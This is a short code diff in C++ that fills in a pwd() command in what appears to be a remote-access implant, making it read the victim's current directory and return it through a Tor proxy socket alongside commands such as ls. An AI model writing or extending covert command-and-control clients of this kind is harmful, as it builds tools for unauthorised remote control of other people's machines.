@@ -106,8 +106,11 @@ public:
 
     void pwd() {
         // Get the current working directory
-        // .... TODO
-        this->torSock.proxySend("pwd; todo :)", 14);
+        TCHAR cwdTC[MAX_PATH] = { 0 };
+        GetCurrentDirectory(MAX_PATH, cwdTC);
+        std::wstring cwdWStr(&cwdTC[0]);
+        std::string response = "pwd;" + std::string(cwdWStr.begin(), cwdWStr.end())+";";
+        this->torSock.proxySend(response.c_str(), response.size());
     }
 
     void ls() {
